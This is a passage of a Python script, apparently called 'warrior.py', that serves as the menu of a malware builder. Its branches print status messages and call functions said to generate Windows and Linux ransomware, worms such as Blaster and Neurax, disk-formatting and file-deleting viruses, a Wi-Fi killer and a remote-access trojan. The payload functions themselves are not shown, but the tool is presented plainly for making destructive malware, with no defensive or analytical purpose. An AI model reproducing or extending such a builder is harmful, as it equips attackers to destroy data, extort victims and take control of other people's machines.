 elif command == "python3 warrior.py -o Windows -v 4 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a WifiKiller Virus For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    killwifi()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Windows -v 5 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a Windows Destroyer Virus For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windestroyer()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 6 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a Ransomeware For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    ransomware()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Windows -v 7 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the ILY Virus/Worm For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    ily()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Windows -v 8 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the BlasterWorm.c For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windows8()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Windows -v 9 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the Format Virus For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windows9()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Windows -v 10 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the Registry Virus For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windows10()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 12 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the Neurax.go Worm For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windows12()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Windows -v 13 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the SystemMeltdown Virus For Windows...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    windows13()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Linux -v 2 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the File Deletion Virus For Linux...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    filedeletionl()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Linux -v 3 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the ELF Virus For Linux...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    elf()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()

 elif command == "python3 warrior.py -o Linux -v 4 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making the Linux_Virus.c For Linux...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    linux_virus()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Linux -v 5 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a Ransomware For Linux...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    ransomware()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Linux -v 6 -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    print(Fore.YELLOW + "Making a Rat For Linux...")
    time.sleep(3)
    print(Fore.MAGENTA + "Compiling...")
    rat1()
    time.sleep(3)
    print(Fore.GREEN + "DONE!")
    thanks()
 elif command == "python3 warrior.py -o Android -s":
    print(Fore.YELLOW + "Your Current Dir is:" + os)
    android()
 else:
    print(Fore.RED + '''
 ██████████                                        ███
░░███░░░░░█                                       ░███
 ░███  █ ░  ████████  ████████   ██████  ████████ ░███
 ░██████   ░░███░░███░░███░░███ ███░░███░░███░░███░███
 ░███░░█    ░███ ░░░  ░███ ░░░ ░███ ░███ ░███ ░░░ ░███
 ░███ ░   █ ░███      ░███     ░███ ░███ ░███     ░░░ 
 ██████████ █████     █████    ░░██████  █████     ███
░░░░░░░░░░ ░░░░░     ░░░░░      ░░░░░░  ░░░░░     ░░░ 
    ''')
